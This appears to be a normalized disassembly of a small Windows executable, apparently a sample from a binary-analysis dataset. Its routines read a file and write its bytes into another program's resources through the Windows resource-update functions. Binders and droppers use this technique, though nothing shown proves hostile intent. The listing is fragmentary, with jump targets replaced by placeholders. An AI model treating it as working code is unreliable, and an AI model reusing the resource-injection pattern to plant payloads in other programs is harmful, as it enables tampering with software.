je r-xdata
push esi
call ebx
mov eax [ esp + 0x18 ]
mov edx [ esp + 0x1c ]
mov ecx [ esp + 0x20 ]
add esp 0x4
inc eax
add edx 0x10
cmp eax ecx
mov [ esp + 0x14 ] eax
mov [ esp + 0x18 ] edx
jl r-xdata
mov ebp [ esp + 0x18 ]
sub_4036d0
push ecx
mov eax [ esp + 0x8 ]
push esi
push eax
mov [ esp + 0x8 ] 0xffff
call [ LoadLibraryA@IAT ]
mov esi eax
test esi esi
je r-xdata
mov eax [ esp + 0x4 ]
pop esi
pop ecx
retn
lea ecx [ esp + 0x4 ]
push ecx
push sub_403710
push 0xe
push esi
call [ EnumResourceNamesA@IAT ]
push esi
call [ FreeLibrary@IAT ]
sub_403740
mov eax [ esp + 0x10 ]
push ebx
push esi
push edi
push 0x0
push 0x80
push 0x3
push 0x0
push 0x1
push 0x80000000
push eax
call [ CreateFileA@IAT ]
mov edi eax
cmp edi 0xffffffff
jne r-xdata
push 0x0
push edi
call [ GetFileSize@IAT ]
mov ebx eax
push ebx
push 0x40
call [ GlobalAlloc@IAT ]
mov esi eax
test esi esi
jne r-xdata
pop edi
pop esi
xor eax eax
pop ebx
retn
lea ecx [ esp + 0x1c ]
push 0x0
push ecx
push ebx
push esi
push edi
call [ ReadFile@IAT ]
push edi
call [ CloseHandle@IAT ]
mov edx [ esp + 0x18 ]
push 0x0
push edx
call [ BeginUpdateResourceA@IAT ]
mov edi eax
test edi edi
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x14 ]
push ebx
push esi
and eax 0xffff
push 0x0
push eax
push ecx
push edi
call [ UpdateResourceA@IAT ]
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
retn
push 0x0
push edi
call [ EndUpdateResourceA@IAT ]
test eax eax
push esi
jne r-xdata
push esi
call [ GlobalFree@IAT ]
pop edi
pop esi
xor eax eax
pop ebx
retn
call [ GlobalFree@IAT ]
pop edi
pop esi
mov eax 0x1
pop ebx
retn
call [ GlobalFree@IAT ]
pop edi
pop esi
xor eax eax
pop ebx
retn
sub_403820
push ebx
push esi
mov eax [ esp + 0x18 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0xc ]
div ecx
mov edx ebx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x18 ]
mov ecx eax
mov eax [ esp + 0x14 ]
mul esi
add edx ecx
jb r-xdata
pop esi
pop ebx
retn 0x10
dec esi
cmp edx [ esp + 0x10 ]
ja r-xdata
jb r-xdata
xor edx edx
mov eax esi
cmp eax [ esp + 0xc ]
jbe r-xdata
_start
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x68
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x4 ] ebx
push 0x2
call [ __set_app_type@IAT ]
pop ecx
or [ rw-data ] 0xffffffff
or [ rw-data ] 0xffffffff
call [ __p__fmode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
call [ __p__commode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
mov eax [ _adjust_fdiv@IAT ]
mov eax [ eax ]
mov [ rw-data ] eax
call sub_403a07
cmp [ rw-data ] ebx
jne r-xdata
call sub_4039f2
push rw-data
push rw-data
call _initterm
mov eax [ rw-data ]
mov [ ebp - 0x6c ] eax
lea eax [ ebp - 0x6c ]
push eax
push [ rw-data ]
lea eax [ ebp - 0x64 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
lea eax [ ebp - 0x60 ]
push eax
call [ __getmainargs@IAT ]
push rw-data
push rw-data
call _initterm
add esp 0x24
mov eax [ _acmdln@IAT ]
mov esi [ eax ]
mov [ ebp - 0x74 ] esi
cmp [ esi ] 0x22
jne r-xdata
push sub_403a04
call [ __setusermatherr@IAT ]
pop ecx
cmp [ esi ] 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
mov al [ esi ]
cmp al bl
je r-xdata
mov al [ esi ]
cmp al bl
je r-xdata
inc esi
mov [ ebp - 0x74 ] esi
jmp r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp al 0x22
jne r-xdata
mov [ ebp - 0x30 ] ebx
lea eax [ ebp - 0x5c ]
push eax
call [ GetStartupInfoA@IAT ]
test [ ebp - 0x30 ] 0x1
je r-xdata
cmp al 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
push 0xa
pop eax
movzx eax [ ebp - 0x2c ]
jmp r-xdata
push eax
push esi
push ebx
push ebx
call [ GetModuleHandleA@IAT ]
push eax
call sub_401030
mov [ ebp - 0x68 ] eax
push eax
call [ exit@IAT ]
sub_401081
mov eax r-xdata
retn
sub_401087
mov eax r-xdata
retn
sub_403710
mov eax [ esp + 0xc ]
test eax 0xffff0000
jne r-xdata
mov eax 0x1
retn 0x10
mov ecx [ esp + 0x10 ]
and eax 0xffff
cmp [ ecx ] eax
jbe r-xdata
mov [ ecx ] eax
__CxxFrameHandler
jmp [ __CxxFrameHandler@IAT ]
_XcptFilter
jmp [ _XcptFilter@IAT ]
_initterm
jmp [ _initterm@IAT ]
sub_4039f2
push 0x30000
push 0x10000
call _controlfp
pop ecx
pop ecx
retn
sub_403a04
xor eax eax
retn
sub_403a07
retn
_except_handler3
jmp [ _except_handler3@IAT ]
_controlfp
jmp [ _controlfp@IAT ]
sub_403a20
mov eax r--data
jmp __CxxFrameHandler
